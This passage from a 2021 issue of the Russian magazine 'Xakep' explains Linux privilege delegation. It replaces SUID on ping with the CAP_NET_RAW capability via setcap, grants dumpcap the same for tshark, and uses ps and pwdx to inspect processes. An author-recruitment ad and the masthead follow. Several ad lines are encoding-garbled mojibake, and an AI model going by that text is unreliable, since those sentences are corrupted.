суперпользователя при помощи механизма SUID/SGID. Например, «обычная»
утилита ping для выпол нения своей работы должна соз дать «необработан‐
ный» raw сетевой сокет, что является с точки зрения ядра привилегированной
операцией. В старых системах (акту ально для Ubuntu до версии 18.10 вклю‐
чительно, начиная с 19.04 все уже «пра вильно из коробки») программа /bin/
ping наделялась атрибутом SUID ❶ и находилась во владении суперполь‐
зователя root, чьи пра ва и передавались при ее запуске. С точки зрения
защищенности системы это не соответству ет здравому смыслу, подсказыва‐
ющему наделять программы минимально необходимыми возможностями,
достаточными для их функционирования. Для создания «необработанных»
raw и пакетных packet сокетов достаточно только привиле гии CAP_NET_RAW,
а весь суперпользовательский набор привилегий более чем избыточен.


Де легирование привиле гий программы ping


  fitz@ubuntu‐1804:~$ ls ‐l /bin/ping
  ❶ ‐rwsr‐xr‐x 1 root root 64424 Jun 28 11:05 /bin/ping
  fitz@ubuntu‐1804:~$ ping ubuntu‐1804
  PING ubuntu‐1804 (127.0.1.1) 56(84) bytes of data.
  64 bytes from ubuntu‐1804 (127.0.1.1): icmp_req=1 ttl=64 time=0.074 ms
  ^C
  ‐‐‐ ubuntu ping statistics ‐‐‐
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  rtt min/avg/max/mdev = 0.074/0.074/0.074/0.000 ms


  fitz@ubuntu‐1804:~$ sudo chmod u‐s /bin/ping
  fitz@ubuntu‐1804:~$ ls ‐l /bin/ping
  ‐rwxr‐xr‐x 1 root root 64424 Jun 28 11:05 /bin/ping
  fitz@ubuntu‐1804:~$ ping ubuntu‐1804
    ping: icmp open socket: Operation not permitted


  ❸ fitz@ubuntu‐1804:~$ sudo setcap cap_net_raw+ep /bin/ping
  fitz@ubuntu‐1804:~$ getcap /bin/ping
  /bin/ping = cap_net_raw+ep
  fitz@ubuntu‐1804:~$ ping ubuntu‐1804
  PING ubuntu (127.0.1.1) 56(84) bytes of data.
    64 bytes from ubuntu (127.0.1.1): icmp_req=1 ttl=64 time=0.142 ms
  ^C
  ‐‐‐ ubuntu ping statistics ‐‐‐
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  rtt min/avg/max/mdev = 0.142/0.142/0.142/0.000 ms


При отключении передачи полномочий ❷ программа /bin/ping лишается
возможности выполнять свои функции, а при наз начении ей при помощи
команды setcap «файловой» привилегии CAP_NET_RAW ❸ функциональность
возвращается в пол ном объеме, т. к. при водит к установке «процессной»
привилегии CAP_NET_RAW при запус ке этой программы. Для просмотра при‐
вилегий, делегируемых при запуске программ, используется парная команда
getcap.
   Аналогично, при исполь зовании анализа торов сетевого трафика tshark и/
или wireshark, вызывающих для захвата сетевых пакетов утилиту dumpcap,
требуется открывать как «необработанные» raw, так и пакетные packet
сетевые сокеты, что требует той же при вилегии CAP_NET_RAW. Классический
способ применения анализаторов пакетов сос тоит в использовании явной
передачи всех полномочий суперполь зователя (при помощи su или sudo)
при их запуске, что опять не соответству ет минимально необходимым и дос‐
таточным требованиям к раз решенным воз можнос тям программ.


Де легирование привиле гий программе tshark


  fitz@ubuntu:~$ tshark
  tshark: There are no interfaces on which a capture can be done
  itz@ubuntu:~$ strace ‐fe execve tshark
  execve("/usr/bin/tshark", ["tshark"], [/* 23 vars */]) = 0
  Process 8951 attached
  [pid  8951] execve("/usr/bin/dumpcap", ["/usr/bin/dumpcap", "‐D", "‐Z",
  "none"],...) = 0
  Process 8951 detached
  ‐‐‐ SIGCHLD (Child exited) @ 0 (0) ‐‐‐
  tshark: There are no interfaces on which a capture can be done
  fitz@ubuntu:~$ ls ‐la /usr/bin/dumpcap
  ‐rwxr‐xr‐x 1 root root 104688 Sep  5 19:43 /usr/bin/dumpcap
  fitz@ubuntu:~$ getcap /usr/bin/dumpcap


  fitz@ubuntu:~$ sudo setcap cap_net_raw+ep /usr/bin/dumpcap
  fitz@ubuntu:~$ getcap /usr/bin/dumpcap
  /usr/bin/dumpcap = cap_net_raw+ep
  fitz@ubuntu:~$ tshark ‐i wlan0
  Capturing on wlan0
    0.307205 fe80::895d:9d7d:f0b3:a372 → ff02::1:ff96:2df6 ICMPv6 86
  Neighbor Solicitation
    0.307460 SuperMic_74:0e:90 → Spanning‐tree‐(for‐bridges)_00 STP 60
  Conf. Root = 32768/0/00:25:90:74:0e:90  Cost = 0  Port = 0x8001
  ...


Для эффективного использования ана лизаторов трафика непривиле гирован‐
ными  пользователями достаточно  делегировать  их процес сам  захвата
пакетов привилегию CAP_NET_RAW при помощи «файловых» привилегий
CAP_NET_RAW для программы захвата /usr/bin/dumpcap, что и проиллюс три‐
ровано в пре дыдущем листинге.


             INFO

                    Необходимо заметить, что все это уже достаточно
                       давно умеет проделывать инсталлятор при уста‐
                       новке  пакета  wireshark‐common  (от  которого
                        зависят пакеты tshark и wireshark), если утверди‐
                         тельно ответить на воп рос инсталлятора ‘Should
                       non‐superusersbeabletocapturepackets?’. Одна‐
                        ко для более простого tcpdump такой услуги
                      не предоставлено ☺.



Другие атрибуты
Переменные окружения и текущий рабочий каталог на поверку тоже оказыва‐
ются атрибутами процес са, которые можно получить при помощи команд ps
и pwdx соответственно.


Пе ремен ные окру жения про цесса


  fitz@ubuntu:~$ ps fe
    PID TTY      STAT   TIME COMMAND
  21872 pts/2    S      0:00 ‐bash USER=fitz LOGNAME=fitz HOME=/home/fitz
  PATH=/usr/...
  22904 pts/2    R+     0:00    _ ps fe LANGUAGE=ru:ko:en
  LC_ADDRESS=ru_RU.UTF‐8 ...



Те кущий рабочий каталог про цесса


  fitz@ubuntu:~$ ps fx
    PID TTY      STAT   TIME COMMAND
  22984 pts/0    S      0:00 ‐bash
  23086 pts/0    S+     0:00    _ man ps
  23097 pts/0    S+     0:00    _ pager
  21872 pts/2    S      0:00 ‐bash
  23103 pts/2    R+     0:00    _ ps fx


  fitz@ubuntu:~$ pwdx 23097 22984
  23097: /home/fitz
  22984: /home/fitz
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №02 (263)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2021